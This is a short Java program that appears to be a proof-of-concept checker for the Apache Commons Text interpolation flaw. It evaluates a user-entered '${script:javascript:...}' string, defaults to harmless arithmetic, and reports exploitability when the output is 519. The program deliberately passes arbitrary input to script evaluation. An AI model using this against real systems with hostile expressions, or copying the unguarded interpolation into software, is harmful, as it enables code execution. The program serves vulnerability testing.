package com.example.demo;

import org.apache.commons.text.StringSubstitutor;

import java.util.Scanner;

public class DemoApplication {

    public static void main(String[] args) {

        final String DEFAULT_POC_STRING = "${script:javascript:195 + 324}";
        StringSubstitutor stringSubstitutor = StringSubstitutor.createInterpolator();

        String fmt = "===============================================================================================================================================================================================";
        System.out.println(fmt);
        System.out.println("Enter your exploit string (press Enter to use the default of '${script:javascript:195 + 324}'): ");
        Scanner in = new Scanner(System.in);

        String exploitString = in.nextLine();

        if (exploitString == null || exploitString.length() == 0) {
            exploitString = DEFAULT_POC_STRING;
        }
        String output = stringSubstitutor.replace(exploitString);
        System.out.println(fmt);
        System.out.printf("Exploiting PoC with the exploit string '%s'%n", exploitString);
        System.out.println(fmt);
        System.out.println("PoC Output:");
        System.out.println(output);
        System.out.println(fmt);
        System.out.printf("If your output for the default input is %d, then your app is exploitable.%n", 519);
        System.out.println(fmt);
    }
}
